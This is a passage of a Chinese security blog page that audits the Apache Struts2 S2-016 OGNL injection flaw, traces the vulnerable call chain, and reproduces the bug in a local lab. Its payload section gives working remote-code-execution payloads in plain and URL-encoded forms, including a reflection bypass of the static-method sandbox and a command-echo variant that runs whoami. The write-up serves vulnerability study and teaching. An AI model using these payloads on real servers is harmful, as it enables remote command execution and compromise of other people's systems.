+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);  <span class="comment">// 提取表达式，跳过前面的 $&#123;</span></span><br><span class="line"><span class="comment">// 所以 var = &quot;1+1&quot;</span></span><br><span class="line"><span class="comment">// 然后丢给 evaluator.evaluate(&quot;1+1&quot;) 执行</span></span><br></pre></td></tr></table></figure>
+
+<p>调用了 <code>ognlEval</code> 这个回调，最后来到：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_2yd5.png"></p>
+<p>这里的代码就和前面的示例代码类似了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">expr    = &quot;1+1&quot;        ← 用户输入的表达式</span><br><span class="line">context = OGNL context ← 里面有 request/response/session</span><br><span class="line">root    = Action 对象  ← HelloAction 实例</span><br><span class="line">asType  = String.class ← 期望返回类型</span><br></pre></td></tr></table></figure>
+
+<p><code>ognlUtil.getValue()</code> 里面就是调用 OGNL 库的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ognl.getValue(expr, context, root)</span><br></pre></td></tr></table></figure>
+
+<p>处理完后把结果处理成字符串返回：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510110717618.png"></p>
+<p>然后经过一系列返回，回到父类的 <code>execute</code> 方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_90gz.png"></p>
+<p>接下来是 <code>doExecute</code> 的方法，其中第一个参数 <code>lastFinalLocation</code> 就是表达式的返回值 <code>2</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_py44.png"></p>
+<p>方法的最后面就是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect(response, finalLocation);</span><br></pre></td></tr></table></figure>
+
+<p>也就是页面的重定向了，这也是为什么表达式注入的时候 URL 变成了 <code>/2</code>。</p>
+<hr>
+<h3 id="漏洞根因总结"><a href="#漏洞根因总结" class="headerlink" title="漏洞根因总结"></a>漏洞根因总结</h3><p>完整调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">用户输入 redirect:$&#123;1+1&#125;</span><br><span class="line">        ↓</span><br><span class="line">DefaultActionMapper.evaluate()</span><br><span class="line">截取 location = &quot;$&#123;1+1&#125;&quot;</span><br><span class="line">        ↓</span><br><span class="line">ServletRedirectResult.execute()</span><br><span class="line">        ↓</span><br><span class="line">StrutsResultSupport.conditionalParse()</span><br><span class="line">        ↓</span><br><span class="line">TextParseUtil.translateVariables()</span><br><span class="line">        ↓</span><br><span class="line">OgnlTextParser.evaluate()</span><br><span class="line">substring 提取 &quot;1+1&quot;</span><br><span class="line">        ↓</span><br><span class="line">evaluator.evaluate(&quot;1+1&quot;)</span><br><span class="line">        ↓</span><br><span class="line">stack.findValue(&quot;1+1&quot;)</span><br><span class="line">        ↓</span><br><span class="line">OgnlUtil.getValue()</span><br><span class="line">        ↓</span><br><span class="line">Ognl.getValue(&quot;1+1&quot;, context, root)</span><br><span class="line">        ↓</span><br><span class="line">返回 2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>conditionalParse()</code> → 执行 OGNL，得到结果 <code>&quot;2&quot;</code></li>
+<li><code>doExecute()</code> → 拿结果去 redirect，和 OGNL 没关系了</li>
+</ul>
+<p><strong>漏洞触发在 <code>conditionalParse()</code>，<code>doExecute()</code> 只是善后，执不执行都无所谓，RCE 已经发生了。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → substring 截取 → setLocation → conditionalParse → OGNL 执行</span><br><span class="line">全程没有任何过滤和验证</span><br></pre></td></tr></table></figure>
+
+<p>只要写法是 <code>?redirect:$&#123;OGNL 表达式&#125;</code> 就能触发，根据看到的代码，能触发的注入点远远不止 <code>redirect:</code> 这一种。</p>
+<hr>
+<h2 id="九、Payload-调试与完整利用"><a href="#九、Payload-调试与完整利用" class="headerlink" title="九、Payload 调试与完整利用"></a>九、Payload 调试与完整利用</h2><h3 id="简单-RCE-Payload（无回显）"><a href="#简单-RCE-Payload（无回显）" class="headerlink" title="简单 RCE Payload（无回显）"></a>简单 RCE Payload（无回显）</h3><p>因为没有任何过滤，随便写能用的 OGNL 代码即可，先试最简单的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%40java.lang.Runtime%40getRuntime().exec(%22calc%22)%7D</span><br></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="问题：静态方法被拦截"><a href="#问题：静态方法被拦截" class="headerlink" title="问题：静态方法被拦截"></a>问题：静态方法被拦截</h3><p>发包之后发现计算器没有正常弹出，而是重定向到了 <code>/</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_6b7k.png"></p>
+<p>调试发现 <code>expr</code> 就是 <code>@java.lang.Runtime@getRuntime().exec(&quot;calc.exe&quot;)</code>，数据正常传入了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rrb1.png"></p>
+<p>但经过 OGNL 返回的 <code>o</code> 确实是 <code>null</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gl75.png"></p>
+<p>这说明数据正常输入了，没有被过滤，但经过 OGNL 处理时却失败了。跟进 <code>ognlEval</code> 里看看怎么回事：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">findValue</span><br><span class="line">&gt;&gt; tryFindValueWhenExpressionIsNotNull</span><br><span class="line">&gt;&gt; tryFindValue</span><br><span class="line">&gt;&gt; getValue</span><br><span class="line">&gt;&gt; ...</span><br></pre></td></tr></table></figure>
+
+<p>最后到了 <code>SecurityMemberAccess.isAccessible()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qdoa.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(modifiers)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (member <span class="keyword">instanceof</span> Method &amp;&amp; !getAllowStaticMethodAccess()) &#123;</span><br><span class="line">        allow = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是拦截静态方法的地方：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">检测到是静态方法调用</span><br><span class="line">        ↓</span><br><span class="line">getAllowStaticMethodAccess() 返回 false</span><br><span class="line">        ↓</span><br><span class="line">allow = false</span><br><span class="line">        ↓</span><br><span class="line">if (!allow) return false</span><br><span class="line">        ↓</span><br><span class="line">isAccessible 返回 false</span><br><span class="line">        ↓</span><br><span class="line">OGNL 拒绝执行</span><br><span class="line">        ↓</span><br><span class="line">返回 null</span><br></pre></td></tr></table></figure>
+
+<p>所以完整 Payload 里那两步绕过是必须的。</p>
+<hr>
+<h3 id="Payload-2：绕过静态方法限制"><a href="#Payload-2：绕过静态方法限制" class="headerlink" title="Payload 2：绕过静态方法限制"></a>Payload 2：绕过静态方法限制</h3><p>Payload 绕过方式就是用反射把 <code>allowStaticMethodAccess</code> 改成 <code>true</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#f = #_memberAccess.getClass().getDeclaredField(<span class="string">&quot;allowStaticMethodAccess&quot;</span>)</span><br><span class="line">#f.setAccessible(<span class="literal">true</span>)</span><br><span class="line">#f.set(#_memberAccess, <span class="literal">true</span>)</span><br><span class="line">        ↓</span><br><span class="line">getAllowStaticMethodAccess() 返回 <span class="literal">true</span></span><br><span class="line">        ↓</span><br><span class="line">allow = <span class="literal">true</span></span><br><span class="line">        ↓</span><br><span class="line">isAccessible 返回 <span class="literal">true</span></span><br><span class="line">        ↓</span><br><span class="line">静态方法调用成功</span><br></pre></td></tr></table></figure>
+
+<p>完整 Payload（格式化版）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;</span><br><span class="line">  #f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),</span><br><span class="line">  #f.setAccessible(true),</span><br><span class="line">  #f.set(#_memberAccess,true),</span><br><span class="line">  @java.lang.Runtime@getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL 编码版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%40java.lang.Runtime%40getRuntime().exec(%22calc.exe%22)%7D</span><br></pre></td></tr></table></figure>
+
+<p>发包之后成功弹出了计算器：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_znm8.png"></p>
+<hr>
+<h3 id="Payload-3：命令回显版"><a href="#Payload-3：命令回显版" class="headerlink" title="Payload 3：命令回显版"></a>Payload 3：命令回显版</h3><p>弹计算器只是验证，实际利用需要命令回显，完整 Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;</span><br><span class="line">  // 用反射把沙箱的 allowStaticMethodAccess 改成 true，允许静态方法调用</span><br><span class="line">  #f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),</span><br><span class="line">  #f.setAccessible(true),</span><br><span class="line">  #f.set(#_memberAccess,true),</span><br><span class="line"></span><br><span class="line">  // 调用 Runtime 静态方法拿到实例，执行 whoami 命令，返回 Process 对象存进 #a</span><br><span class="line">  #a=@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;),</span><br><span class="line"></span><br><span class="line">  // 读取命令执行结果：Java 里标准的读取进程输出写法</span><br><span class="line">  #b=new java.io.InputStreamReader(#a.getInputStream()),</span><br><span class="line">  #c=new java.io.BufferedReader(#b),</span><br><span class="line">  #d=#c.readLine(),</span><br><span class="line"></span><br><span class="line">  // 从 OGNL context 里取出 HttpServletResponse 对象存进 #matt</span><br><span class="line">  // 用全限定名取是因为 Struts2 就是用这个 key 存进去的</span><br><span class="line">  #matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">  // 把命令执行结果写进 HTTP Response，在 Burp 的 Response body 里就能看到结果</span><br><span class="line">  #matt.getWriter().println(#d),</span><br><span class="line">  #matt.getWriter().flush(),</span><br><span class="line">  #matt.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL 编码版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22whoami%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br></pre></td></tr></table></figure>
+
+<p>命令回显成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5ww2.png"></p>
+<hr>
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>S2-016 本身不复杂，但背后的东西值得花时间搞清楚。</p>
+<p><strong>漏洞核心：</strong> 用户输入的 <code>redirect:</code> 后面的内容，在 <code>DefaultActionMapper</code> 里被 <code>substring</code> 截取后没有任何过滤，直接通过 <code>setLocation</code> 存入 <code>ServletRedirectResult</code>，最终在 <code>StrutsResultSupport.conditionalParse()</code> 里被丢给 OGNL 引擎执行，实现 RCE。</p>
+<p><strong>OGNL 注入的本质：</strong> 就是表达式注入的一种，和 SSTI 同类，区别只在于解析引擎不同。OGNL 直接对应 Java 代码，<code>Runtime.exec()</code> 调用路径极短，加上 Java 反射机制强大，沙箱绕过相对容易，比模板引擎的 SSTI 更危险。</p>
+<p><strong>Struts2 为什么漏洞这么多：</strong> 框架过度依赖 OGNL，URL 参数名、参数值前缀、请求头、请求体、文件名、命名空间处处都在做 OGNL 求值，只要有一个地方没过滤用户输入，就是漏洞。</p>
+</article>
+<div class="article-footer slide-up">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer slide-up footnote"><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right"><div class="sidebg"></div><div class="rightbar-container">
+<div class="rightbar-top-btn">
+  <a class="top" onclick="util.scrollTop()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg>
+    <span>回到顶部</span>
+  </a>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select" onclick="sidebar.toggleTOC()"><span class="name">本文目录</span></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Struts2-%E2%80%94%E2%80%94-S2-016-OGNL-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">代码审计 | Struts2 —— S2-016 OGNL 注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">一、环境搭建与漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81URL-%E7%BC%96%E7%A0%81%E7%9A%84%E9%82%A3%E7%82%B9%E7%BB%86%E8%8A%82"><span class="toc-text">二、URL 编码的那点细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Payload-%E7%BB%93%E6%9E%84%E6%8B%86%E8%A7%A3"><span class="toc-text">三、Payload 结构拆解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81OGNL-%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8"><span class="toc-text">四、OGNL 语法入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OGNL-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">OGNL 是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGNL-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">OGNL 基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">为什么能执行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%89%8D%E4%B8%A4%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">为什么需要前两行绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%B8%AA%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">整个执行流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%AF%94"><span class="toc-text">五、表达式注入类比</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-%E5%92%8C-OGNL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B1%E5%90%8C%E6%9C%AC%E8%B4%A8"><span class="toc-text">SSTI 和 OGNL 注入的共同本质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E7%B1%BB%E6%AF%94"><span class="toc-text">具体类比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-OGNL-%E6%AF%94-Jinja2-SSTI-%E6%9B%B4%E5%8D%B1%E9%99%A9"><span class="toc-text">为什么 OGNL 比 Jinja2 SSTI 更危险</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81OGNL-%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-text">六、OGNL 示例代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">示例 1：基础用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2%EF%BC%9Aroot-%E5%AF%B9%E8%B1%A1%E4%B8%8E-context-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">示例 2：root 对象与 context 的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%90%AD%E5%BB%BA-Struts2-%E9%9D%B6%E5%9C%BA%EF%BC%88%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">七、搭建 Struts2 靶场（本地复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA-Tomcat-%E9%A1%B9%E7%9B%AE"><span class="toc-text">新建 Tomcat 项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E4%B8%AA%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">四个文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">验证漏洞触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-%E5%AE%8C%E6%95%B4%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-text">Struts2 完整请求流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">八、代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%EF%BC%9AStrutsPrepareAndExecuteFilter"><span class="toc-text">入口：StrutsPrepareAndExecuteFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#executeAction-%E4%B8%8E-ActionMapping"><span class="toc-text">executeAction 与 ActionMapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts-default-xml-%E4%B8%8E%E5%90%84%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">struts-default.xml 与各版本注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E7%9D%80%E8%B0%83%E7%94%A8%E9%93%BE%E5%BE%80%E4%B8%8B%E8%B5%B0"><span class="toc-text">顺着调用链往下走</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E8%A7%A6%E5%8F%91%EF%BC%9AconditionalParse-%E2%86%92-OGNL-%E6%89%A7%E8%A1%8C"><span class="toc-text">核心触发：conditionalParse → OGNL 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93"><span class="toc-text">漏洞根因总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Payload-%E8%B0%83%E8%AF%95%E4%B8%8E%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8"><span class="toc-text">九、Payload 调试与完整利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95-RCE-Payload%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-text">简单 RCE Payload（无回显）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%A2%AB%E6%8B%A6%E6%88%AA"><span class="toc-text">问题：静态方法被拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-2%EF%BC%9A%E7%BB%95%E8%BF%87%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E9%99%90%E5%88%B6"><span class="toc-text">Payload 2：绕过静态方法限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-3%EF%BC%9A%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E7%89%88"><span class="toc-text">Payload 3：命令回显版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">十、总结</span></a></li></ol></li></ol></div><div class="widget-footer"></div></widget>
+</div></div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
